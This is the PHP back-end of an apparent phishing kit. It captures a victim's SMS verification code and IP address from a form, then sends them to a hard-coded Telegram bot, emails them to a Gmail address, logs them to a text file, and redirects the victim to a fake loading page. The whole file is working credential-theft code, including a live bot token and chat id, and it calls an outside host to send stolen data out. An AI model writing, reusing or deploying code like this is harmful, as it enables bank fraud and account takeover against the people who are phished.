<?php
include "to.php";
session_start();
$ch = curl_init();
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$foo);
$result = curl_exec($ch);
curl_close($ch);
function curl_get_contents($url)
{
  $curl = curl_init($url);
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
  $data = curl_exec($curl);
  curl_close($curl);
  if(empty($data)){
	file_get_contents($url);
  } 
  return $data;
}
$ip = getenv("REMOTE_ADDR");
$message .= "---------------- Code sms -----------------\n";
$message .= "-----------------Info----------------------\n";
$message .= "Code sms 1  : ".$_POST['sms']."\n";
$message .= "------------------Info D'IP-------------------------\n";
$message .= "IP                : $ip\n";
$message .= "--------------- ---------------\n";

curl_get_contents("https://api.telegram.org/bot1214048489:AAHIVbfhVpW2VRPIQGchfzcFNcvgYIh3F1g/sendMessage?chat_id=724126649&text=" . urlencode($message)."" );

$sen = "$send";

$subject = "POST AED INFORMATION PERSONNAL AND CARD ~ $ip";

$from .= "From: AED POST~<Troj>\n";
$from .= "To:thexab@gmail.com";

mail($sen,$subject,$message,$from);

$file = fopen("../info.txt","a");
fwrite($file,$message); 


echo '<script language="Javascript">
<!--
document.location.replace("loadiing.html?ID=CGDJCLF5P2KMQW297425846");
// -->
</script>';
?>